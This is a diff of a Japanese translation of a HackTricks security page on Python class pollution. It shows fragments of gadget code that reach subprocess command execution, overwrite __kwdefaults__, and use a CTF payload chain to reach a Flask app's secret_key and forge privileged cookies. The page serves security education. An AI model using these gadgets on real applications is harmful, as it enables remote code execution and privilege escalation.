@@ -1,10 +1,10 @@
-# クラス汚染 (Pythonのプロトタイプ汚染)
+# Class Pollution (Python's Prototype Pollution)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## 基本的な例
+## 基本例
 
-文字列を使ってオブジェクトのクラスを汚染する方法を確認してください:
+文字列を使用してオブジェクトのクラスをpolluteする方法を確認します:<sup>[[1]](#references)</sup>
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -61,11 +61,11 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-## Gadget Examples
+## Gadgetの例
 
 <details>
 
-<summary>クラスプロパティのデフォルト値をRCE（サブプロセス）に設定する</summary>
+<summary>クラスプロパティのデフォルト値を作成してRCEを実行（subprocess）</summary><sup>[[1]](#references)</sup>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -116,7 +116,7 @@ print(system_admin_emp.execute_command())
 
 <details>
 
-<summary>他のクラスやグローバル変数を<code>globals</code>を通じて汚染する</summary>
+<summary><code>globals</code>を通じて他のクラスとグローバル変数を汚染する</summary><sup>[[1]](#references)</sup>
 ```python
 def merge(src, dst):
 # Recursive merge function
@@ -148,7 +148,7 @@ print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 
 <details>
 
-<summary>任意のサブプロセスの実行</summary>
+<summary>任意のサブプロセス実行</summary><sup>[[1]](#references)</sup>
 ```python
 import subprocess, json
 
@@ -180,9 +180,9 @@ subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 
 <details>
 
-<summary>Overwritting <strong><code>__kwdefaults__</code></strong></summary>
+<summary><strong><code>__kwdefaults__</code></strong>の上書き</summary>
 
-**`__kwdefaults__`** はすべての関数の特別な属性であり、Pythonの[ドキュメント](https://docs.python.org/3/library/inspect.html)に基づいています。これは「**キーワード専用**パラメータのデフォルト値のマッピング」です。この属性を汚染することで、関数のキーワード専用パラメータのデフォルト値を制御することができます。これらは、\*または\*argsの後に来る関数のパラメータです。
+**`__kwdefaults__`**はすべての関数に存在する特殊な属性です。Pythonの[documentation](https://docs.python.org/3/library/inspect.html)によると、これは「**keyword-only**パラメータのデフォルト値のマッピング」です。この属性をpolluteすることで、関数のkeyword-onlyパラメータのデフォルト値を制御できます。これらは、\*または\*argsの後に記述される関数のパラメータです。<sup>[[1]](#references)</sup>
 ```python
 from os import system
 import json
@@ -223,32 +223,33 @@ execute() #> Executing echo Polluted
 
 <details>
 
-<summary>ファイル間でのFlaskシークレットの上書き</summary>
+<summary>ファイル間での Flask secret の上書き</summary>
 
-したがって、ウェブのメインPythonファイルで定義されたオブジェクトに対してクラス汚染を行うことができる場合、**そのクラスがメインファイルとは異なるファイルで定義されている**必要があります。前のペイロードで\_\_globals\_\_にアクセスするには、オブジェクトのクラスまたはクラスのメソッドにアクセスする必要があるため、**そのファイルのグローバルにアクセスできますが、メインのものにはアクセスできません**。\
-したがって、**メインページでシークレットキーを定義したFlaskアプリのグローバルオブジェクトにアクセスできなくなります**。
+つまり、web の main Python file で定義されたオブジェクトに対して class pollution を実行できても、**そのクラスが main file とは異なる file で定義されている場合**です。以前の payload で \_\_globals\_\_ にアクセスするには、オブジェクトのクラス、またはそのクラスのメソッドにアクセスする必要があるため、**その file の globals にはアクセスできますが、main file の globals にはアクセスできません**。 \
+したがって、main page で **secret key** を定義した Flask app の global object には、**アクセスできません**。<sup>[[1]](#references)</sup>
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-このシナリオでは、ファイルを横断してメインのファイルに到達し、**グローバルオブジェクト `app.secret_key`** にアクセスしてFlaskのシークレットキーを変更し、このキーを知ることで[**権限を昇格させる**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)必要があります。
+このシナリオでは、ファイルをトラバースして目的のファイルに到達し、**グローバルオブジェクト `app.secret_key` にアクセス**するための gadget が必要です。これにより Flask の secret key を変更し、このキーを知ることで[**権限昇格**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)が可能になります。
 
-このようなペイロードは、[このレポート](https://ctftime.org/writeup/36082)からのものです：
+この[writeup](https://ctftime.org/writeup/36082)に記載されている次のような payload:<sup>[[2]](#references)</sup>
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-このペイロードを使用して **`app.secret_key`** を変更し（アプリ内の名前は異なる場合があります）、新しいより多くの権限を持つフラスククッキーに署名できるようにします。
+この payload を使用して **`app.secret_key`**（アプリ内での名前は異なる場合があります）を変更し、新しい、より高い権限を持つ flask cookies に署名できるようにします。
 
 </details>
 
-次のページも参照して、読み取り専用のガジェットを確認してください：
+その他の read only gadgets については、次のページも確認してください:
 
 {{#ref}}
 python-internal-read-gadgets.md
 {{#endref}}
 
-## 参考文献
+## 参考資料
 
-- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
 
 {{#include ../../banners/hacktricks-training.md}}
